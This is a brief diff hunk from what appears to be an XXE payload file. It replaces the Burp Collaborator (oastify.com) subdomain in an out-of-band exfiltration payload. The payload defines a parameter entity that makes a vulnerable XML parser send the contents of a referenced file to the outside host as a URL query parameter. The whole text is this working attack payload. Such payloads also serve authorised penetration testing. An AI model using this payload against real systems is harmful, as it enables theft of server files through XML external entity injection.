@@ -1,3 +1,3 @@
 <!ENTITY % payload "<!ENTITY exfil SYSTEM                                          
-'http://jm9scug38b0dmwrbchw5184zkqqhe98xx.oastify.com/?data=%file;'>">                            
+'http://qhbz71ba3ivkh3mi7orcwfz6fxlo9g54u.oastify.com/?data=%file;'>">                            
 %payload;
